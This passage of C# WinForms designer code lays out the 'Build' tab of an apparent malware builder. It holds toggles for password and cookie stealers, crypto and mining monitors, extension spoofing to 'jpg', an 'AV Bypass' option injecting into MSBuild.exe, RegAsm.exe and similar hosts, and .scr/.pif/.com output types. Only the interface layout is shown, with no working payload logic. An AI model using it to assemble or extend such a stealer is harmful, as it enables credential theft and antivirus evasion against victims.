		Label88.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label88.ForeColor = Color.White;
		Label88.Location = new Point(53, 11);
		Label88.Name = "Label88";
		Label88.Size = new Size(103, 14);
		Label88.TabIndex = 199;
		Label88.Text = "Assembly Cloner";
		As1.Animated = true;
		As1.AutoRoundedCorners = true;
		As1.BackColor = Color.FromArgb(24, 30, 54);
		As1.BorderColor = Color.FromArgb(0, 126, 249);
		As1.BorderRadius = 13;
		As1.BorderStyle = DashStyle.Custom;
		As1.Cursor = Cursors.IBeam;
		As1.DefaultText = "";
		As1.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		As1.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		As1.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		As1.DisabledState.Parent = As1;
		As1.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		As1.Enabled = false;
		As1.FillColor = Color.FromArgb(24, 30, 54);
		As1.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		As1.FocusedState.Parent = As1;
		As1.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		As1.ForeColor = Color.White;
		As1.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		As1.HoverState.Parent = As1;
		As1.Location = new Point(20, 91);
		As1.Margin = new Padding(3, 2, 3, 2);
		As1.Name = "As1";
		As1.PasswordChar = '\0';
		As1.PlaceholderForeColor = Color.Gray;
		As1.PlaceholderText = "Title";
		As1.SelectedText = "";
		As1.ShadowDecoration.Parent = As1;
		As1.Size = new Size(367, 29);
		As1.Style = TextBoxStyle.Material;
		As1.TabIndex = 37;
		As1.TextAlign = HorizontalAlignment.Center;
		Guna2ToggleSwitch2.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Guna2ToggleSwitch2.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Guna2ToggleSwitch2.CheckedState.InnerBorderColor = Color.White;
		Guna2ToggleSwitch2.CheckedState.InnerColor = Color.White;
		Guna2ToggleSwitch2.CheckedState.Parent = Guna2ToggleSwitch2;
		Guna2ToggleSwitch2.Location = new Point(10, 9);
		Guna2ToggleSwitch2.Name = "Guna2ToggleSwitch2";
		Guna2ToggleSwitch2.ShadowDecoration.Parent = Guna2ToggleSwitch2;
		Guna2ToggleSwitch2.Size = new Size(35, 20);
		Guna2ToggleSwitch2.TabIndex = 198;
		Guna2ToggleSwitch2.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Guna2ToggleSwitch2.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Guna2ToggleSwitch2.UncheckedState.InnerBorderColor = Color.White;
		Guna2ToggleSwitch2.UncheckedState.InnerColor = Color.White;
		Guna2ToggleSwitch2.UncheckedState.Parent = Guna2ToggleSwitch2;
		TabPage3.BackColor = Color.FromArgb(46, 51, 73);
		TabPage3.Controls.Add(Panel24);
		TabPage3.Location = new Point(4, 22);
		TabPage3.Name = "TabPage3";
		TabPage3.Size = new Size(894, 398);
		TabPage3.TabIndex = 10;
		TabPage3.Text = "Build";
		Panel24.BackColor = Color.FromArgb(46, 51, 73);
		Panel24.Controls.Add(Panel30);
		Panel24.Controls.Add(Panel29);
		Panel24.Controls.Add(Panel28);
		Panel24.Controls.Add(Panel39);
		Panel24.Controls.Add(Panel38);
		Panel24.Controls.Add(Panel37);
		Panel24.Controls.Add(Panel35);
		Panel24.Controls.Add(Building);
		Panel24.Dock = DockStyle.Fill;
		Panel24.ForeColor = Color.FromArgb(37, 42, 64);
		Panel24.Location = new Point(0, 0);
		Panel24.Name = "Panel24";
		Panel24.Size = new Size(894, 398);
		Panel24.TabIndex = 68;
		Panel30.BackColor = Color.FromArgb(24, 30, 54);
		Panel30.Controls.Add(PictureBox79);
		Panel30.Controls.Add(PictureBox26);
		Panel30.Controls.Add(Label59);
		Panel30.Controls.Add(MPASSZ);
		Panel30.Controls.Add(Label40);
		Panel30.Controls.Add(Cookies);
		Panel30.Location = new Point(12, 145);
		Panel30.Name = "Panel30";
		Panel30.Size = new Size(310, 101);
		Panel30.TabIndex = 124;
		PictureBox79.Image = (Image)componentResourceManager.GetObject("PictureBox79.Image");
		PictureBox79.Location = new Point(12, 60);
		PictureBox79.Name = "PictureBox79";
		PictureBox79.Size = new Size(48, 30);
		PictureBox79.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox79.TabIndex = 206;
		PictureBox79.TabStop = false;
		PictureBox26.Image = (Image)componentResourceManager.GetObject("PictureBox26.Image");
		PictureBox26.Location = new Point(12, 13);
		PictureBox26.Name = "PictureBox26";
		PictureBox26.Size = new Size(48, 30);
		PictureBox26.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox26.TabIndex = 213;
		PictureBox26.TabStop = false;
		Label59.AutoSize = true;
		Label59.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label59.ForeColor = Color.White;
		Label59.Location = new Point(110, 68);
		Label59.Name = "Label59";
		Label59.Size = new Size(112, 14);
		Label59.TabIndex = 205;
		Label59.Text = "Passwords Stealer";
		MPASSZ.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		MPASSZ.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		MPASSZ.CheckedState.InnerBorderColor = Color.White;
		MPASSZ.CheckedState.InnerColor = Color.White;
		MPASSZ.CheckedState.Parent = MPASSZ;
		MPASSZ.Location = new Point(68, 66);
		MPASSZ.Name = "MPASSZ";
		MPASSZ.ShadowDecoration.Parent = MPASSZ;
		MPASSZ.Size = new Size(35, 20);
		MPASSZ.TabIndex = 204;
		MPASSZ.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		MPASSZ.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		MPASSZ.UncheckedState.InnerBorderColor = Color.White;
		MPASSZ.UncheckedState.InnerColor = Color.White;
		MPASSZ.UncheckedState.Parent = MPASSZ;
		Label40.AutoSize = true;
		Label40.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label40.ForeColor = Color.White;
		Label40.Location = new Point(110, 21);
		Label40.Name = "Label40";
		Label40.Size = new Size(95, 14);
		Label40.TabIndex = 212;
		Label40.Text = "Cookies Stealer";
		Cookies.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Cookies.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Cookies.CheckedState.InnerBorderColor = Color.White;
		Cookies.CheckedState.InnerColor = Color.White;
		Cookies.CheckedState.Parent = Cookies;
		Cookies.Location = new Point(68, 19);
		Cookies.Name = "Cookies";
		Cookies.ShadowDecoration.Parent = Cookies;
		Cookies.Size = new Size(35, 20);
		Cookies.TabIndex = 211;
		Cookies.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Cookies.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Cookies.UncheckedState.InnerBorderColor = Color.White;
		Cookies.UncheckedState.InnerColor = Color.White;
		Cookies.UncheckedState.Parent = Cookies;
		Panel29.BackColor = Color.FromArgb(24, 30, 54);
		Panel29.Controls.Add(TXT_SPOOFING);
		Panel29.Controls.Add(PictureBox77);
		Panel29.Controls.Add(Label92);
		Panel29.Controls.Add(SPOFFING);
		Panel29.Location = new Point(12, 10);
		Panel29.Name = "Panel29";
		Panel29.Size = new Size(310, 131);
		Panel29.TabIndex = 123;
		TXT_SPOOFING.Animated = true;
		TXT_SPOOFING.AutoRoundedCorners = true;
		TXT_SPOOFING.BackColor = Color.FromArgb(24, 30, 54);
		TXT_SPOOFING.BorderColor = Color.FromArgb(0, 126, 249);
		TXT_SPOOFING.BorderRadius = 13;
		TXT_SPOOFING.BorderStyle = DashStyle.Custom;
		TXT_SPOOFING.Cursor = Cursors.IBeam;
		TXT_SPOOFING.DefaultText = "jpg";
		TXT_SPOOFING.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		TXT_SPOOFING.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		TXT_SPOOFING.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		TXT_SPOOFING.DisabledState.Parent = TXT_SPOOFING;
		TXT_SPOOFING.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		TXT_SPOOFING.Enabled = false;
		TXT_SPOOFING.FillColor = Color.FromArgb(24, 30, 54);
		TXT_SPOOFING.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		TXT_SPOOFING.FocusedState.Parent = TXT_SPOOFING;
		TXT_SPOOFING.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		TXT_SPOOFING.ForeColor = Color.White;
		TXT_SPOOFING.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		TXT_SPOOFING.HoverState.Parent = TXT_SPOOFING;
		TXT_SPOOFING.Location = new Point(12, 73);
		TXT_SPOOFING.Margin = new Padding(3, 2, 3, 2);
		TXT_SPOOFING.Name = "TXT_SPOOFING";
		TXT_SPOOFING.PasswordChar = '\0';
		TXT_SPOOFING.PlaceholderForeColor = Color.Gray;
		TXT_SPOOFING.PlaceholderText = "";
		TXT_SPOOFING.SelectedText = "";
		TXT_SPOOFING.SelectionStart = 3;
		TXT_SPOOFING.ShadowDecoration.Parent = TXT_SPOOFING;
		TXT_SPOOFING.Size = new Size(283, 29);
		TXT_SPOOFING.Style = TextBoxStyle.Material;
		TXT_SPOOFING.TabIndex = 217;
		TXT_SPOOFING.TextAlign = HorizontalAlignment.Center;
		PictureBox77.Image = (Image)componentResourceManager.GetObject("PictureBox77.Image");
		PictureBox77.Location = new Point(7, 7);
		PictureBox77.Name = "PictureBox77";
		PictureBox77.Size = new Size(48, 30);
		PictureBox77.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox77.TabIndex = 216;
		PictureBox77.TabStop = false;
		Label92.AutoSize = true;
		Label92.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label92.ForeColor = Color.White;
		Label92.Location = new Point(105, 15);
		Label92.Name = "Label92";
		Label92.Size = new Size(56, 14);
		Label92.TabIndex = 215;
		Label92.Text = "Spoofing";
		SPOFFING.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		SPOFFING.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		SPOFFING.CheckedState.InnerBorderColor = Color.White;
		SPOFFING.CheckedState.InnerColor = Color.White;
		SPOFFING.CheckedState.Parent = SPOFFING;
		SPOFFING.Location = new Point(63, 13);
		SPOFFING.Name = "SPOFFING";
		SPOFFING.ShadowDecoration.Parent = SPOFFING;
		SPOFFING.Size = new Size(35, 20);
		SPOFFING.TabIndex = 214;
		SPOFFING.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		SPOFFING.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		SPOFFING.UncheckedState.InnerBorderColor = Color.White;
		SPOFFING.UncheckedState.InnerColor = Color.White;
		SPOFFING.UncheckedState.Parent = SPOFFING;
		Panel28.BackColor = Color.FromArgb(24, 30, 54);
		Panel28.Controls.Add(PictureBox31);
		Panel28.Controls.Add(Label91);
		Panel28.Controls.Add(MBRBZ);
		Panel28.Controls.Add(PictureBox78);
		Panel28.Controls.Add(MMinings);
		Panel28.Controls.Add(Label56);
		Panel28.Location = new Point(12, 250);
		Panel28.Name = "Panel28";
		Panel28.Size = new Size(310, 121);
		Panel28.TabIndex = 122;
		PictureBox31.Image = (Image)componentResourceManager.GetObject("PictureBox31.Image");
		PictureBox31.Location = new Point(12, 71);
		PictureBox31.Name = "PictureBox31";
		PictureBox31.Size = new Size(48, 30);
		PictureBox31.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox31.TabIndex = 213;
		PictureBox31.TabStop = false;
		Label91.AutoSize = true;
		Label91.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label91.ForeColor = Color.White;
		Label91.Location = new Point(109, 79);
		Label91.Name = "Label91";
		Label91.Size = new Size(144, 14);
		Label91.TabIndex = 212;
		Label91.Text = "Monitor Crypto Currency";
		MBRBZ.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		MBRBZ.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		MBRBZ.CheckedState.InnerBorderColor = Color.White;
		MBRBZ.CheckedState.InnerColor = Color.White;
		MBRBZ.CheckedState.Parent = MBRBZ;
		MBRBZ.Enabled = false;
		MBRBZ.Location = new Point(68, 77);
		MBRBZ.Name = "MBRBZ";
		MBRBZ.ShadowDecoration.Parent = MBRBZ;
		MBRBZ.Size = new Size(35, 20);
		MBRBZ.TabIndex = 211;
		MBRBZ.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		MBRBZ.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		MBRBZ.UncheckedState.InnerBorderColor = Color.White;
		MBRBZ.UncheckedState.InnerColor = Color.White;
		MBRBZ.UncheckedState.Parent = MBRBZ;
		PictureBox78.Image = (Image)componentResourceManager.GetObject("PictureBox78.Image");
		PictureBox78.Location = new Point(12, 26);
		PictureBox78.Name = "PictureBox78";
		PictureBox78.Size = new Size(48, 30);
		PictureBox78.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox78.TabIndex = 209;
		PictureBox78.TabStop = false;
		MMinings.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		MMinings.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		MMinings.CheckedState.InnerBorderColor = Color.White;
		MMinings.CheckedState.InnerColor = Color.White;
		MMinings.CheckedState.Parent = MMinings;
		MMinings.Enabled = false;
		MMinings.Location = new Point(68, 31);
		MMinings.Name = "MMinings";
		MMinings.ShadowDecoration.Parent = MMinings;
		MMinings.Size = new Size(35, 20);
		MMinings.TabIndex = 207;
		MMinings.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		MMinings.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		MMinings.UncheckedState.InnerBorderColor = Color.White;
		MMinings.UncheckedState.InnerColor = Color.White;
		MMinings.UncheckedState.Parent = MMinings;
		Label56.AutoSize = true;
		Label56.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label56.ForeColor = Color.White;
		Label56.Location = new Point(109, 33);
		Label56.Name = "Label56";
		Label56.Size = new Size(90, 14);
		Label56.TabIndex = 208;
		Label56.Text = "Monitor Mining";
		Panel39.BackColor = Color.FromArgb(24, 30, 54);
		Panel39.Controls.Add(NETFRAMWORKS);
		Panel39.Controls.Add(Label90);
		Panel39.Location = new Point(326, 145);
		Panel39.Name = "Panel39";
		Panel39.Size = new Size(243, 101);
		Panel39.TabIndex = 120;
		NETFRAMWORKS.Animated = true;
		NETFRAMWORKS.AutoRoundedCorners = true;
		NETFRAMWORKS.BackColor = Color.Transparent;
		NETFRAMWORKS.BorderColor = Color.White;
		NETFRAMWORKS.BorderRadius = 17;
		NETFRAMWORKS.DrawMode = DrawMode.OwnerDrawFixed;
		NETFRAMWORKS.DropDownStyle = ComboBoxStyle.DropDownList;
		NETFRAMWORKS.FillColor = Color.FromArgb(46, 51, 73);
		NETFRAMWORKS.FocusedColor = Color.FromArgb(94, 148, 255);
		NETFRAMWORKS.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		NETFRAMWORKS.FocusedState.Parent = NETFRAMWORKS;
		NETFRAMWORKS.Font = new Font("Segoe UI", 10f);
		NETFRAMWORKS.ForeColor = Color.White;
		NETFRAMWORKS.HoverState.Parent = NETFRAMWORKS;
		NETFRAMWORKS.ItemHeight = 30;
		NETFRAMWORKS.Items.AddRange(new object[5] { ".NET Framework 2.0", ".NET Framework 3.0", ".NET Framework 3.5", ".NET Framework 4.0", ".NET Framework 4.5" });
		NETFRAMWORKS.ItemsAppearance.Parent = NETFRAMWORKS;
		NETFRAMWORKS.Location = new Point(7, 46);
		NETFRAMWORKS.Name = "NETFRAMWORKS";
		NETFRAMWORKS.ShadowDecoration.Parent = NETFRAMWORKS;
		NETFRAMWORKS.Size = new Size(226, 36);
		NETFRAMWORKS.TabIndex = 121;
		Label90.AutoSize = true;
		Label90.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label90.ForeColor = Color.White;
		Label90.Location = new Point(9, 7);
		Label90.Name = "Label90";
		Label90.Size = new Size(90, 14);
		Label90.TabIndex = 210;
		Label90.Text = "Net framework";
		Panel38.BackColor = Color.FromArgb(24, 30, 54);
		Panel38.Controls.Add(PictureBox83);
		Panel38.Controls.Add(CMD);
		Panel38.Controls.Add(PictureBox84);
		Panel38.Controls.Add(BAT);
		Panel38.Controls.Add(PictureBox85);
		Panel38.Controls.Add(PIF);
		Panel38.Controls.Add(PictureBox82);
		Panel38.Controls.Add(COM);
		Panel38.Controls.Add(PictureBox81);
		Panel38.Controls.Add(SCR);
		Panel38.Controls.Add(Label60);
		Panel38.Controls.Add(PictureBox80);
		Panel38.Controls.Add(EXE);
		Panel38.Location = new Point(326, 10);
		Panel38.Name = "Panel38";
		Panel38.Size = new Size(554, 131);
		Panel38.TabIndex = 119;
		PictureBox83.Image = (Image)componentResourceManager.GetObject("PictureBox83.Image");
		PictureBox83.Location = new Point(372, 84);
		PictureBox83.Name = "PictureBox83";
		PictureBox83.Size = new Size(48, 30);
		PictureBox83.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox83.TabIndex = 210;
		PictureBox83.TabStop = false;
		CMD.AutoSize = true;
		CMD.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		CMD.CheckedState.BorderThickness = 0;
		CMD.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		CMD.CheckedState.InnerColor = Color.White;
		CMD.CheckedState.InnerOffset = -4;
		CMD.Cursor = Cursors.Hand;
		CMD.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		CMD.ForeColor = Color.White;
		CMD.Location = new Point(426, 89);
		CMD.Name = "CMD";
		CMD.Size = new Size(119, 19);
		CMD.TabIndex = 209;
		CMD.Text = "extension (*.cmd)";
		CMD.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		CMD.UncheckedState.BorderThickness = 2;
		CMD.UncheckedState.FillColor = Color.Transparent;
		CMD.UncheckedState.InnerColor = Color.Transparent;
		PictureBox84.Image = (Image)componentResourceManager.GetObject("PictureBox84.Image");
		PictureBox84.Location = new Point(188, 84);
		PictureBox84.Name = "PictureBox84";
		PictureBox84.Size = new Size(48, 30);
		PictureBox84.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox84.TabIndex = 208;
		PictureBox84.TabStop = false;
		BAT.AutoSize = true;
		BAT.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		BAT.CheckedState.BorderThickness = 0;
		BAT.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		BAT.CheckedState.InnerColor = Color.White;
		BAT.CheckedState.InnerOffset = -4;
		BAT.Cursor = Cursors.Hand;
		BAT.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		BAT.ForeColor = Color.White;
		BAT.Location = new Point(242, 89);
		BAT.Name = "BAT";
		BAT.Size = new Size(112, 19);
		BAT.TabIndex = 207;
		BAT.Text = "extension (*.bat)";
		BAT.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		BAT.UncheckedState.BorderThickness = 2;
		BAT.UncheckedState.FillColor = Color.Transparent;
		BAT.UncheckedState.InnerColor = Color.Transparent;
		PictureBox85.Image = (Image)componentResourceManager.GetObject("PictureBox85.Image");
		PictureBox85.Location = new Point(9, 84);
		PictureBox85.Name = "PictureBox85";
		PictureBox85.Size = new Size(48, 30);
		PictureBox85.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox85.TabIndex = 206;
		PictureBox85.TabStop = false;
		PIF.AutoSize = true;
		PIF.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		PIF.CheckedState.BorderThickness = 0;
		PIF.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		PIF.CheckedState.InnerColor = Color.White;
		PIF.CheckedState.InnerOffset = -4;
		PIF.Cursor = Cursors.Hand;
		PIF.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		PIF.ForeColor = Color.White;
		PIF.Location = new Point(63, 89);
		PIF.Name = "PIF";
		PIF.Size = new Size(110, 19);
		PIF.TabIndex = 205;
		PIF.Text = "extension (*.pif)";
		PIF.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		PIF.UncheckedState.BorderThickness = 2;
		PIF.UncheckedState.FillColor = Color.Transparent;
		PIF.UncheckedState.InnerColor = Color.Transparent;
		PictureBox82.Image = (Image)componentResourceManager.GetObject("PictureBox82.Image");
		PictureBox82.Location = new Point(372, 37);
		PictureBox82.Name = "PictureBox82";
		PictureBox82.Size = new Size(48, 30);
		PictureBox82.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox82.TabIndex = 204;
		PictureBox82.TabStop = false;
		COM.AutoSize = true;
		COM.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		COM.CheckedState.BorderThickness = 0;
		COM.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		COM.CheckedState.InnerColor = Color.White;
		COM.CheckedState.InnerOffset = -4;
		COM.Cursor = Cursors.Hand;
		COM.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		COM.ForeColor = Color.White;
		COM.Location = new Point(426, 42);
		COM.Name = "COM";
		COM.Size = new Size(119, 19);
		COM.TabIndex = 203;
		COM.Text = "extension (*.com)";
		COM.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		COM.UncheckedState.BorderThickness = 2;
		COM.UncheckedState.FillColor = Color.Transparent;
		COM.UncheckedState.InnerColor = Color.Transparent;
		PictureBox81.Image = (Image)componentResourceManager.GetObject("PictureBox81.Image");
		PictureBox81.Location = new Point(188, 37);
		PictureBox81.Name = "PictureBox81";
		PictureBox81.Size = new Size(48, 30);
		PictureBox81.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox81.TabIndex = 202;
		PictureBox81.TabStop = false;
		SCR.AutoSize = true;
		SCR.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		SCR.CheckedState.BorderThickness = 0;
		SCR.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		SCR.CheckedState.InnerColor = Color.White;
		SCR.CheckedState.InnerOffset = -4;
		SCR.Cursor = Cursors.Hand;
		SCR.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		SCR.ForeColor = Color.White;
		SCR.Location = new Point(242, 42);
		SCR.Name = "SCR";
		SCR.Size = new Size(110, 19);
		SCR.TabIndex = 201;
		SCR.Text = "extension (*.scr)";
		SCR.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		SCR.UncheckedState.BorderThickness = 2;
		SCR.UncheckedState.FillColor = Color.Transparent;
		SCR.UncheckedState.InnerColor = Color.Transparent;
		Label60.AutoSize = true;
		Label60.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label60.ForeColor = Color.White;
		Label60.Location = new Point(6, 7);
		Label60.Name = "Label60";
		Label60.Size = new Size(84, 14);
		Label60.TabIndex = 200;
		Label60.Text = "File extension";
		PictureBox80.Image = (Image)componentResourceManager.GetObject("PictureBox80.Image");
		PictureBox80.Location = new Point(9, 37);
		PictureBox80.Name = "PictureBox80";
		PictureBox80.Size = new Size(48, 30);
		PictureBox80.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox80.TabIndex = 144;
		PictureBox80.TabStop = false;
		EXE.AutoSize = true;
		EXE.Checked = true;
		EXE.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		EXE.CheckedState.BorderThickness = 0;
		EXE.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		EXE.CheckedState.InnerColor = Color.White;
		EXE.CheckedState.InnerOffset = -4;
		EXE.Cursor = Cursors.Hand;
		EXE.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		EXE.ForeColor = Color.White;
		EXE.Location = new Point(63, 42);
		EXE.Name = "EXE";
		EXE.Size = new Size(113, 19);
		EXE.TabIndex = 102;
		EXE.TabStop = true;
		EXE.Text = "extension (*.exe)";
		EXE.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		EXE.UncheckedState.BorderThickness = 2;
		EXE.UncheckedState.FillColor = Color.Transparent;
		EXE.UncheckedState.InnerColor = Color.Transparent;
		Panel37.BackColor = Color.FromArgb(24, 30, 54);
		Panel37.Controls.Add(Guna2ComboBox1);
		Panel37.Controls.Add(PictureBox28);
		Panel37.Controls.Add(Label44);
		Panel37.Controls.Add(Encrypt);
		Panel37.Location = new Point(328, 250);
		Panel37.Name = "Panel37";
		Panel37.Size = new Size(552, 63);
		Panel37.TabIndex = 118;
		Guna2ComboBox1.Animated = true;
		Guna2ComboBox1.AutoRoundedCorners = true;
		Guna2ComboBox1.BackColor = Color.Transparent;
		Guna2ComboBox1.BorderColor = Color.White;
		Guna2ComboBox1.BorderRadius = 17;
		Guna2ComboBox1.DrawMode = DrawMode.OwnerDrawFixed;
		Guna2ComboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
		Guna2ComboBox1.Enabled = false;
		Guna2ComboBox1.FillColor = Color.FromArgb(46, 51, 73);
		Guna2ComboBox1.FocusedColor = Color.FromArgb(94, 148, 255);
		Guna2ComboBox1.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		Guna2ComboBox1.FocusedState.Parent = Guna2ComboBox1;
		Guna2ComboBox1.Font = new Font("Segoe UI", 10f);
		Guna2ComboBox1.ForeColor = Color.White;
		Guna2ComboBox1.HoverState.Parent = Guna2ComboBox1;
		Guna2ComboBox1.ItemHeight = 30;
		Guna2ComboBox1.Items.AddRange(new object[5] { "injection in AppLaunch.exe", "injection in MSBuild.exe", "injection in RegAsm.exe", "injection in jsc.exe", "injection in vbc.exe" });
		Guna2ComboBox1.ItemsAppearance.Parent = Guna2ComboBox1;
		Guna2ComboBox1.Location = new Point(246, 15);
		Guna2ComboBox1.Name = "Guna2ComboBox1";
		Guna2ComboBox1.ShadowDecoration.Parent = Guna2ComboBox1;
		Guna2ComboBox1.Size = new Size(290, 36);
		Guna2ComboBox1.TabIndex = 222;
		PictureBox28.Image = (Image)componentResourceManager.GetObject("PictureBox28.Image");
		PictureBox28.Location = new Point(7, 15);
		PictureBox28.Name = "PictureBox28";
		PictureBox28.Size = new Size(48, 36);
		PictureBox28.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox28.TabIndex = 219;
		PictureBox28.TabStop = false;
		Label44.AutoSize = true;
		Label44.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label44.ForeColor = Color.White;
		Label44.Location = new Point(105, 26);
		Label44.Name = "Label44";
		Label44.Size = new Size(65, 14);
		Label44.TabIndex = 218;
		Label44.Text = "AV Bypass";
		Encrypt.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Encrypt.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Encrypt.CheckedState.InnerBorderColor = Color.White;
		Encrypt.CheckedState.InnerColor = Color.White;
		Encrypt.CheckedState.Parent = Encrypt;
		Encrypt.Location = new Point(63, 24);
		Encrypt.Name = "Encrypt";
		Encrypt.ShadowDecoration.Parent = Encrypt;
		Encrypt.Size = new Size(35, 20);
		Encrypt.TabIndex = 217;
		Encrypt.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Encrypt.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Encrypt.UncheckedState.InnerBorderColor = Color.White;
		Encrypt.UncheckedState.InnerColor = Color.White;
		Encrypt.UncheckedState.Parent = Encrypt;
		Panel35.BackColor = Color.FromArgb(24, 30, 54);
		Panel35.Controls.Add(Nu);
		Panel35.Controls.Add(KB);
		Panel35.Controls.Add(ZIS);
		Panel35.Controls.Add(MB);
		Panel35.Controls.Add(Label55);
		Panel35.Controls.Add(GB);
		Panel35.Controls.Add(Label6);
		Panel35.Location = new Point(574, 145);
		Panel35.Name = "Panel35";
		Panel35.Size = new Size(306, 101);
		Panel35.TabIndex = 117;
		Nu.BackColor = Color.FromArgb(37, 42, 64);
		Nu.Enabled = false;
		Nu.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Nu.ForeColor = Color.White;
		Nu.Location = new Point(11, 67);
		Nu.Maximum = new decimal(new int[4] { 9999999, 0, 0, 0 });
		Nu.Name = "Nu";
		Nu.Size = new Size(71, 23);
		Nu.TabIndex = 114;
		Nu.Value = new decimal(new int[4] { 24, 0, 0, 0 });
		KB.AutoSize = true;
		KB.Checked = true;
		KB.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		KB.CheckedState.BorderThickness = 0;
		KB.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		KB.CheckedState.InnerColor = Color.White;
		KB.CheckedState.InnerOffset = -4;
		KB.Cursor = Cursors.Hand;
		KB.Enabled = false;
		KB.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		KB.ForeColor = Color.White;
		KB.Location = new Point(111, 67);
		KB.Name = "KB";
		KB.Size = new Size(39, 19);
		KB.TabIndex = 105;
		KB.TabStop = true;
		KB.Text = "Kb";
		KB.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		KB.UncheckedState.BorderThickness = 2;
		KB.UncheckedState.FillColor = Color.Transparent;
		KB.UncheckedState.InnerColor = Color.Transparent;
		ZIS.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		ZIS.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		ZIS.CheckedState.InnerBorderColor = Color.White;
		ZIS.CheckedState.InnerColor = Color.White;
		ZIS.CheckedState.Parent = ZIS;
		ZIS.Location = new Point(11, 9);
		ZIS.Name = "ZIS";
		ZIS.ShadowDecoration.Parent = ZIS;
		ZIS.Size = new Size(35, 20);
		ZIS.TabIndex = 116;
